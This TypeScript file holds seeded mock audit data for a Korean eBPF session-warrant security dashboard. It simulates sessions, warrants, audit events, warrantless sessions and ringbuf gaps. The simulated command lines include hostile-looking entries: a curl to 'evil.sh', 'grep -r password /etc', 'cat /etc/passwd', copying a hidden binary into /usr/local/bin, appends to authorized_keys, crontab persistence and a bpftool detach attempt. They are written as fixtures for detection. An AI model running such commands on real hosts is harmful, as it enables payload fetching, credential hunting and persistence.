/* Session Warrant 대시보드 — 목 데이터 (dashboard/data.js 의 TypeScript 판).
 *
 * 실서비스에서는 중앙 서버의 감사 이벤트 API(audit.proto → AuditEvent) 가 이 자리를 대신한다.
 * 필드 이름은 docs/session-warrant-ebpf-fields.html §03(공통 메타)·§11(ringbuf 레코드) 를 따른다.
 * 시드 고정 난수라 새로고침해도 같은 화면이 나온다.
 */

export type Verdict = "ALLOW" | "WOULD_DENY" | "DENY"
export type Hook = "exec" | "write" | "unlink" | "rename" | "connect" | "self" | "agg"
export type Mode = "observe" | "dryrun" | "enforce"
export type OnExpiry = "downgrade" | "kill" | "grace"

export interface Subject { id: number; name: string; email: string; team: string }
export interface LineageStep { t: number; kind: string; who: string; note: string }
export interface Warrant {
  id: string; subject: number; node: string; mode: Mode; on_expiry: OnExpiry; reason: string
  policy: { write: string[]; exec: string; net: string[] }
  issued: number; expires: number; cgroup: number; session: string; lineage: LineageStep[]
}
export interface AuditEvent {
  id: string; node: string; seq: number; ts: number
  warrant: string | null; subject: number | null; cgroup: number
  pid: number; tgid: number; start_time: number; ppid: number; uid: number; euid: number
  pid_ns: number; mnt_ns: number
  hook: Hook; verdict: Verdict; comm: string; note?: string
  // exec
  dev?: string; ino?: number; filename?: string; argv?: string; interp?: string | null; setuid?: boolean
  // write · unlink · rename
  path?: string; parent_ino?: number; flags?: string
  // connect
  family?: "AF_INET" | "AF_UNIX"; addr?: string; port?: number
  // agg
  count?: number; window?: string
}
export interface WarrantlessSession {
  node: string; cgroup: number; session: string; uid: number; from: string; first: number
  reason: string; severity: "critical" | "warning"; count: number; last: number
}
export interface Gap { node: string; from: number; to: number; seq_from: number; seq_to: number; dropped: number; cause: string }

function rng(seed: number) {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
const R = rng(20260906)
const pick = <T,>(arr: T[]): T => arr[Math.floor(R() * arr.length)]
const between = (lo: number, hi: number) => lo + Math.floor(R() * (hi - lo + 1))

// "지금" 은 고정한다 — 2026-09-06 16:10 KST. 화면의 모든 상대 시각이 여기서 나온다.
export const NOW = new Date("2026-09-06T16:10:00+09:00").getTime()
export const MIN = 60 * 1000

export const subjects: Record<number, Subject> = {
  101: { id: 101, name: "김개발", email: "kim.dev@seswar.io", team: "플랫폼" },
  102: { id: 102, name: "이운영", email: "lee.ops@seswar.io", team: "SRE" },
  103: { id: 103, name: "박폴", email: "paul@seswar.io", team: "데이터" },
  104: { id: 104, name: "최보안", email: "choi.sec@seswar.io", team: "보안" },
}

export const nodes: Record<string, { kernel: string; lsm: string; mode: string }> = {
  "prod-web-01": { kernel: "6.8.0-45", lsm: "lockdown,yama,apparmor,bpf", mode: "감사" },
  "prod-web-02": { kernel: "6.8.0-45", lsm: "lockdown,yama,apparmor,bpf", mode: "감사" },
  "prod-db-01": { kernel: "6.8.0-41", lsm: "lockdown,yama,apparmor,bpf", mode: "감사" },
  "stage-app-01": { kernel: "6.8.0-45", lsm: "lockdown,yama,apparmor,bpf", mode: "강제(dry-run)" },
}

// mode: observe(기록만) · dryrun(WOULD_DENY) · enforce(DENY). §12 struct warrant.mode
// on_expiry: downgrade(강등) · kill(종료) · grace(유예). §03
export const warrants: Warrant[] = [
  {
    id: "W-4821-3F", subject: 101, node: "prod-web-01", mode: "dryrun", on_expiry: "downgrade",
    reason: "INC-4821 · nginx 설정 롤백", policy: { write: ["/app"], exec: "기본 셸 도구 + git + systemctl", net: ["10.0.0.0/8"] },
    issued: NOW - 130 * MIN, expires: NOW + 20 * MIN, cgroup: 8213, session: "session-412.scope",
    lineage: [
      { t: NOW - 134 * MIN, kind: "요청", who: "김개발", note: "사유: INC-4821 · /app 쓰기 · 30분" },
      { t: NOW - 131 * MIN, kind: "승인", who: "김팀장", note: "Slack 승인 · 정책 lint 경고 없음" },
      { t: NOW - 130 * MIN, kind: "발급", who: "중앙", note: "Ed25519 서명 · warrantd push 완료 (prod-web-01)" },
      { t: NOW - 129 * MIN, kind: "바인딩", who: "pam_warrant", note: "session-412.scope → cgroup 8213 · pam_systemd 이후 확인" },
      { t: NOW - 105 * MIN, kind: "연장 +30분", who: "김팀장", note: "사유: \"배포 지연\" · T-5분 자동 요청" },
      { t: NOW - 75 * MIN, kind: "연장 +30분", who: "정팀장", note: "read-only 아님 → 자동 승인 불가, 사람 승인" },
      { t: NOW - 45 * MIN, kind: "연장 +60분", who: "정팀장", note: "누적 2.5배 · 상한(3배) 직전" },
    ],
  },
  {
    id: "W-4830-A1", subject: 102, node: "prod-db-01", mode: "observe", on_expiry: "kill",
    reason: "CHG-2210 · 백업 검증 (read-only)", policy: { write: [], exec: "read-only 도구", net: [] },
    issued: NOW - 300 * MIN, expires: NOW - 60 * MIN, cgroup: 5510, session: "session-88.scope",
    lineage: [
      { t: NOW - 303 * MIN, kind: "요청", who: "이운영", note: "사유: CHG-2210 · read-only · 2시간" },
      { t: NOW - 301 * MIN, kind: "승인", who: "정팀장", note: "read-only 정책 · 자동 승인 대상" },
      { t: NOW - 300 * MIN, kind: "발급", who: "중앙", note: "warrantd push 완료 (prod-db-01)" },
      { t: NOW - 299 * MIN, kind: "바인딩", who: "pam_warrant", note: "session-88.scope → cgroup 5510" },
      { t: NOW - 180 * MIN, kind: "연장 +60분", who: "자동 승인", note: "근거: read-only 정책 1회차" },
      { t: NOW - 60 * MIN, kind: "만료", who: "커널", note: "on_expiry=종료 · warrantd 가 scope 프로세스 정리 · 잔여 0" },
    ],
  },
  {
    id: "W-4833-C7", subject: 103, node: "prod-web-02", mode: "dryrun", on_expiry: "grace",
    reason: "데이터 파이프라인 재실행", policy: { write: ["/srv/pipeline"], exec: "python3 + 기본 도구", net: ["10.20.0.0/16"] },
    issued: NOW - 200 * MIN, expires: NOW - 20 * MIN, cgroup: 9107, session: "session-51.scope",
    lineage: [
      { t: NOW - 204 * MIN, kind: "요청", who: "박폴", note: "사유: 파이프라인 재실행 · 3시간" },
      { t: NOW - 201 * MIN, kind: "승인", who: "김팀장", note: "lint 경고: exec 허용 목록에 인터프리터(python3) — 화이트리스트 실효성 낮음" },
      { t: NOW - 200 * MIN, kind: "발급", who: "중앙", note: "warrantd push 완료 (prod-web-02)" },
      { t: NOW - 199 * MIN, kind: "바인딩", who: "pam_warrant", note: "session-51.scope → cgroup 9107" },
      { t: NOW - 20 * MIN, kind: "만료 → 유예", who: "커널", note: "세션 종료 · nohup 잡 2개 유예 실행 중 · grace +2시간 · 신규 connect 금지" },
    ],
  },
  {
    id: "W-4836-E2", subject: 104, node: "stage-app-01", mode: "enforce", on_expiry: "downgrade",
    reason: "강제 모드 드라이런 검증 (스테이징)", policy: { write: ["/opt/stage"], exec: "기본 셸 도구", net: [] },
    issued: NOW - 90 * MIN, expires: NOW + 30 * MIN, cgroup: 3321, session: "session-17.scope",
    lineage: [
      { t: NOW - 92 * MIN, kind: "요청", who: "최보안", note: "사유: 스테이징 강제 검증 · 2시간" },
      { t: NOW - 91 * MIN, kind: "승인", who: "김팀장", note: "enforce 모드 — 스테이징 한정" },
      { t: NOW - 90 * MIN, kind: "발급", who: "중앙", note: "warrantd push 완료 (stage-app-01)" },
      { t: NOW - 89 * MIN, kind: "바인딩", who: "pam_warrant", note: "session-17.scope → cgroup 3321" },
    ],
  },
]
export const warrantById: Record<string, Warrant> = Object.fromEntries(warrants.map((w) => [w.id, w]))

// (dev, ino) 가 1급 증거, path 는 가독성용
interface Bin { dev: string; ino: number; path: string; interp?: boolean; setuid?: boolean; interpBy?: string }
const BIN: Record<string, Bin> = {
  bash: { dev: "259:3", ino: 1048712, path: "/usr/bin/bash", interp: true },
  ls: { dev: "259:3", ino: 1048901, path: "/usr/bin/ls" },
  cat: { dev: "259:3", ino: 1048623, path: "/usr/bin/cat" },
  vim: { dev: "259:3", ino: 1051220, path: "/usr/bin/vim.basic" },
  sudo: { dev: "259:3", ino: 1049330, path: "/usr/bin/sudo", setuid: true },
  git: { dev: "259:3", ino: 1052871, path: "/usr/bin/git" },
  grep: { dev: "259:3", ino: 1048777, path: "/usr/bin/grep" },
  tail: { dev: "259:3", ino: 1048902, path: "/usr/bin/tail" },
  systemctl: { dev: "259:3", ino: 1050114, path: "/usr/bin/systemctl" },
  "systemd-run": { dev: "259:3", ino: 1050118, path: "/usr/bin/systemd-run" },
  curl: { dev: "259:3", ino: 1053002, path: "/usr/bin/curl" },
  python3: { dev: "259:3", ino: 1054210, path: "/usr/bin/python3.12", interp: true },
  cp: { dev: "259:3", ino: 1048640, path: "/usr/bin/cp" },
  docker: { dev: "259:3", ino: 1061020, path: "/usr/bin/docker" },
  crontab: { dev: "259:3", ino: 1049870, path: "/usr/bin/crontab", setuid: true },
  bpftool: { dev: "259:3", ino: 1062330, path: "/usr/sbin/bpftool" },
  "deploy.sh": { dev: "259:5", ino: 20481, path: "/app/bin/deploy.sh", interpBy: "bash" },
  tar: { dev: "259:3", ino: 1048811, path: "/usr/bin/tar" },
  pg_dump: { dev: "259:3", ino: 1070211, path: "/usr/bin/pg_dump" },
}

export const HOOKS: Record<Hook, string> = {
  exec: "lsm/bprm_check_security",
  write: "lsm/file_open",
  unlink: "lsm/inode_unlink",
  rename: "lsm/inode_rename",
  connect: "lsm/socket_connect",
  self: "lsm/bpf",
  agg: "집계(write allow)",
}

export const events: AuditEvent[] = []
const seqByNode: Record<string, number> = Object.fromEntries(Object.keys(nodes).map((n) => [n, 40000 + between(0, 900)]))
let pidCounter = 4000

type Extra = Partial<AuditEvent> & { cgroup?: number }
function base(node: string, t: number, w: Warrant | null, extra: Extra): AuditEvent {
  const seq = ++seqByNode[node]
  const pid = pidCounter++
  const uid = 1000 + (w ? w.subject - 100 : between(0, 9))
  return {
    id: `${node}#${seq}`, node, seq, ts: t,
    warrant: w ? w.id : null, subject: w ? w.subject : null, cgroup: w ? w.cgroup : (extra.cgroup ?? 0),
    pid, tgid: pid, start_time: t - between(1, 900) * 1000, ppid: pid - between(1, 40), uid, euid: uid,
    pid_ns: 4026531836, mnt_ns: 4026531841,
    hook: "exec", verdict: "ALLOW", comm: "",
    ...extra,
  }
}
function execEv(node: string, t: number, w: Warrant | null, name: string, argv: string, verdict: Verdict, opts?: Extra) {
  const b = BIN[name]
  events.push(base(node, t, w, {
    hook: "exec", verdict, comm: name.slice(0, 15),
    dev: b.dev, ino: b.ino, filename: b.path, argv,
    interp: b.interpBy ? BIN[b.interpBy].path : null, setuid: !!b.setuid,
    ...opts,
  }))
}
function writeEv(node: string, t: number, w: Warrant | null, path: string, dev: string, ino: number, verdict: Verdict, flags: string, opts?: Extra) {
  if (verdict === "ALLOW") return // 허용 쓰기는 개별 기록 없음 — 5분 집계 한 건으로 대체 (§11)
  events.push(base(node, t, w, {
    hook: "write", verdict, comm: pick(["vim.basic", "bash", "cp", "python3", "tar"]),
    dev, ino, path, parent_ino: ino - between(1, 200), flags, ...opts,
  }))
}
function connectEv(node: string, t: number, w: Warrant | null, addr: string, port: number, verdict: Verdict, opts?: Extra) {
  events.push(base(node, t, w, {
    hook: "connect", verdict, comm: pick(["curl", "python3", "git", "ssh"]),
    family: addr.startsWith("/") || addr.startsWith("@") ? "AF_UNIX" : "AF_INET", addr, port, ...opts,
  }))
}

// 김개발 (W-4821-3F, dryrun): §03 시나리오를 그대로 흘린다
{
  const w = warrantById["W-4821-3F"]
  let t = w.issued + 2 * MIN
  const uid0 = { uid: 1001, euid: 0 }
  execEv(w.node, t, w, "bash", "-bash", "ALLOW")
  for (let i = 0; i < 46; i++) {
    t += between(1, 4) * MIN
    const r = R()
    if (r < 0.35) execEv(w.node, t, w, pick(["ls", "cat", "grep", "tail", "git"]), pick(["ls -la /app", "cat /app/config.yml", "grep -n upstream /app/nginx/site.conf", "tail -f /app/log/app.log", "git -C /app status", "git -C /app log --oneline -5"]), "ALLOW")
    else if (r < 0.55) { execEv(w.node, t, w, "vim", "vi /app/config.yml", "ALLOW"); writeEv(w.node, t + 20000, w, "/app/config.yml", "259:5", 20517, "ALLOW", "O_WRONLY|O_TRUNC") }
    else if (r < 0.68) { execEv(w.node, t, w, "sudo", "sudo vi /etc/nginx/nginx.conf", "ALLOW"); execEv(w.node, t + 300, w, "vim", "vi /etc/nginx/nginx.conf", "ALLOW", uid0); writeEv(w.node, t + 25000, w, "/etc/nginx/nginx.conf", "259:3", 786452, "WOULD_DENY", "O_WRONLY|O_TRUNC", uid0) }
    else if (r < 0.76) { execEv(w.node, t, w, "sudo", "sudo cp tool /usr/bin/", "ALLOW"); execEv(w.node, t + 200, w, "cp", "cp tool /usr/bin/", "ALLOW", uid0); writeEv(w.node, t + 400, w, "/usr/bin/tool", "259:3", 1049999, "WOULD_DENY", "O_WRONLY|O_CREAT", uid0) }
    else if (r < 0.86) { execEv(w.node, t, w, "curl", "curl https://evil.sh/x.sh", "ALLOW"); connectEv(w.node, t + 120, w, "185.220.101.7", 443, "WOULD_DENY") }
    else if (r < 0.93) connectEv(w.node, t, w, "10.0.12.40", 5432, "ALLOW")
    else { execEv(w.node, t, w, "systemctl", "systemctl restart nginx", "ALLOW"); connectEv(w.node, t + 50, w, "/run/systemd/private", 0, "WOULD_DENY", { comm: "systemctl" }) }
  }
  // 위임 시도 — §04 표의 '끊김' 경로. 실행 자체는 감사 모드라 통과하고 소켓만 WOULD_DENY
  execEv(w.node, w.issued + 61 * MIN, w, "systemd-run", "systemd-run --scope ./deploy.sh", "WOULD_DENY")
  connectEv(w.node, w.issued + 61 * MIN + 80, w, "/run/systemd/private", 0, "WOULD_DENY", { comm: "systemd-run" })
  execEv(w.node, w.issued + 62 * MIN, w, "deploy.sh", "nohup ./deploy.sh &", "ALLOW", { comm: "deploy.sh" })
  execEv(w.node, w.issued + 95 * MIN, w, "crontab", "crontab -e", "ALLOW")
  writeEv(w.node, w.issued + 95 * MIN + 3000, w, "/var/spool/cron/crontabs/kim.dev", "259:3", 917511, "WOULD_DENY", "O_WRONLY|O_CREAT")
}

// 이운영 (W-4830-A1, observe, read-only) — 만료로 종료된 세션
{
  const w = warrantById["W-4830-A1"]
  let t = w.issued + 1 * MIN
  execEv(w.node, t, w, "bash", "-bash", "ALLOW")
  for (let i = 0; i < 28; i++) {
    t += between(2, 8) * MIN
    if (t > w.expires) break
    const r = R()
    if (r < 0.6) execEv(w.node, t, w, pick(["ls", "cat", "grep", "tail", "pg_dump"]), pick(["ls -la /var/backups", "cat /etc/postgresql/16/main/postgresql.conf", "tail -n 200 /var/log/postgresql/postgresql-16-main.log", "pg_dump --schema-only app"]), "ALLOW")
    else if (r < 0.75) writeEv(w.node, t, w, "/tmp/pg_check.out", "0:38", 22, "WOULD_DENY", "O_WRONLY|O_CREAT")
    else if (r < 0.9) connectEv(w.node, t, w, "10.0.12.40", 5432, "ALLOW")
    else { execEv(w.node, t, w, "sudo", "sudo tail /var/log/auth.log", "ALLOW"); execEv(w.node, t + 100, w, "tail", "tail /var/log/auth.log", "ALLOW", { uid: 1002, euid: 0 }) }
  }
  events.push(base(w.node, w.expires, w, { hook: "self", verdict: "ALLOW", comm: "warrantd", note: "만료 · on_expiry=종료 · scope 프로세스 3개 SIGTERM · nohup 잔여 0" }))
}

// 박폴 (W-4833-C7, dryrun) — python 파이프라인, 유예 진입
{
  const w = warrantById["W-4833-C7"]
  let t = w.issued + 1 * MIN
  execEv(w.node, t, w, "bash", "-bash", "ALLOW")
  for (let i = 0; i < 40; i++) {
    t += between(2, 6) * MIN
    if (t > NOW) break
    const grace = t > w.expires
    const r = R()
    if (r < 0.4) execEv(w.node, t, w, "python3", pick(["python3 run_pipeline.py --stage extract", "python3 -c \"import os; os.system('curl http://10.20.4.9/health')\"", "python3 run_pipeline.py --stage load"]), "ALLOW", { comm: "python3" })
    else if (r < 0.6) writeEv(w.node, t, w, "/srv/pipeline/out/part-" + between(0, 99) + ".parquet", "259:7", 40000 + between(1, 999), "ALLOW", "O_WRONLY|O_CREAT")
    else if (r < 0.75) connectEv(w.node, t, w, "10.20.4.9", 8080, grace ? "WOULD_DENY" : "ALLOW", grace ? { note: "유예 중 신규 connect 금지 (§03 ②)" } : {})
    else if (r < 0.85) writeEv(w.node, t, w, "/home/paul/.ssh/authorized_keys", "259:3", 655441, "WOULD_DENY", "O_WRONLY|O_APPEND")
    else if (r < 0.93) execEv(w.node, t, w, "docker", "docker exec -it etl-worker bash", "ALLOW")
    else connectEv(w.node, t, w, "/var/run/docker.sock", 0, "WOULD_DENY", { comm: "docker" })
  }
  events.push(base(w.node, w.expires, w, { hook: "self", verdict: "ALLOW", comm: "warrantd", note: "만료 → 유예 진입 · 셸·sshd 종료 · nohup 잡 2개(run_pipeline.py ×2) 유예 실행 중 · 승인자 경보 발송" }))
}

// 최보안 (W-4836-E2, enforce, 스테이징) — DENY 가 실제로 나오는 유일한 노드
{
  const w = warrantById["W-4836-E2"]
  let t = w.issued + 1 * MIN
  execEv(w.node, t, w, "bash", "-bash", "ALLOW")
  for (let i = 0; i < 26; i++) {
    t += between(1, 5) * MIN
    if (t > NOW) break
    const r = R()
    if (r < 0.4) execEv(w.node, t, w, pick(["ls", "cat", "grep", "tail"]), pick(["ls /opt/stage", "cat /opt/stage/release.txt", "tail -n 50 /opt/stage/log/app.log"]), "ALLOW")
    else if (r < 0.55) writeEv(w.node, t, w, "/opt/stage/release.txt", "259:9", 3120, "ALLOW", "O_WRONLY|O_TRUNC")
    else if (r < 0.7) { execEv(w.node, t, w, "sudo", "sudo vi /etc/hosts", "ALLOW"); writeEv(w.node, t + 9000, w, "/etc/hosts", "259:3", 786600, "DENY", "O_WRONLY|O_TRUNC", { uid: 1004, euid: 0 }) }
    else if (r < 0.8) { execEv(w.node, t, w, "curl", "curl https://api.github.com", "ALLOW"); connectEv(w.node, t + 90, w, "140.82.112.5", 443, "DENY") }
    else if (r < 0.9) execEv(w.node, t, w, "bpftool", "sudo bpftool prog detach ...", "DENY", { uid: 1004, euid: 0, note: "자기보호 — 영장에 명시 허용 없음 (§16)" })
    else events.push(base(w.node, t, w, { hook: "unlink", verdict: "DENY", comm: "rm", path: "/etc/systemd/system/app.service", dev: "259:3", ino: 790112, parent_ino: 790001, uid: 1004, euid: 0 }))
  }
}

// 허용된 쓰기는 개별 기록 없이 5분 집계 한 건씩 (§11). 쓰기 정책이 없는 영장은 0건이라 집계도 없다.
warrants.forEach((w) => {
  if (!w.policy.write.length) return
  const end = Math.min(NOW, w.on_expiry === "grace" ? w.expires + 120 * MIN : w.expires)
  for (let k = w.issued + 5 * MIN; k < end; k += 5 * MIN) {
    events.push(base(w.node, k, w, { hook: "agg", verdict: "ALLOW", comm: "warrantd", count: between(120, 1900), window: "5분" }))
  }
})

// 무영장 세션 — §07 STEP 2. 게이트웨이를 우회한 접속 · PAM 장애로 허용된 접속
export const warrantless: WarrantlessSession[] = [
  { node: "prod-web-02", cgroup: 9350, session: "session-53.scope", uid: 1007, from: "192.168.40.12", first: NOW - 88 * MIN, reason: "직접 접속 — 게이트웨이 기록 없음", severity: "critical", count: 0, last: 0 },
  { node: "prod-db-01", cgroup: 5602, session: "session-91.scope", uid: 1002, from: "10.0.3.21", first: NOW - 52 * MIN, reason: "PAM → warrantd 연결 실패 · fail-open 으로 허용 (§17)", severity: "warning", count: 0, last: 0 },
  { node: "prod-web-01", cgroup: 8290, session: "session-419.scope", uid: 0, from: "10.0.3.5", first: NOW - 14 * MIN, reason: "root 직접 로그인 · 영장 조회 없음", severity: "critical", count: 0, last: 0 },
]
warrantless.forEach((s) => {
  let t = s.first
  const opts: Extra = { cgroup: s.cgroup, uid: s.uid, euid: s.uid }
  execEv(s.node, t, null, "bash", "-bash", "ALLOW", opts)
  const n = between(6, 16)
  for (let i = 0; i < n; i++) {
    t += between(1, 6) * MIN
    if (t > NOW) break
    const r = R()
    if (r < 0.6) execEv(s.node, t, null, pick(["ls", "cat", "grep", "tail", "git"]), pick(["ls -la", "cat /etc/passwd", "grep -r password /etc", "tail /var/log/syslog"]), "ALLOW", opts)
    else if (r < 0.85) execEv(s.node, t, null, pick(["vim", "cp", "python3"]), pick(["vi /etc/cron.d/job", "cp /tmp/.x /usr/local/bin/", "python3 -c \"import socket\""]), "ALLOW", { note: "무영장 — 판정 없음, 귀속만 기록", ...opts })
    else connectEv(s.node, t, null, pick(["45.33.32.156", "10.0.12.40"]), pick([22, 443, 5432]), "ALLOW", opts)
  }
  s.count = events.filter((e) => e.warrant === null && e.cgroup === s.cgroup).length
  s.last = t
})

// ringbuf 유실 구간 — seq 가 건너뛴 것을 warrantd 가 감지 (§11). 숨기지 않고 기록한다.
export const gaps: Gap[] = [
  { node: "prod-web-01", from: NOW - 118 * MIN, to: NOW - 118 * MIN + 3200, seq_from: 40487, seq_to: 40554, dropped: 67, cause: "ringbuf 포화 — apt 재설치 버스트 (초당 1,100 open)" },
  { node: "prod-web-02", from: NOW - 71 * MIN, to: NOW - 69 * MIN, seq_from: 41120, seq_to: 41208, dropped: 88, cause: "warrantd 재시작 (bpffs pin 유지 · 훅은 계속 판정)" },
  { node: "prod-db-01", from: NOW - 33 * MIN, to: NOW - 33 * MIN + 900, seq_from: 40922, seq_to: 40934, dropped: 12, cause: "ringbuf 포화" },
]

events.sort((a, b) => a.ts - b.ts)
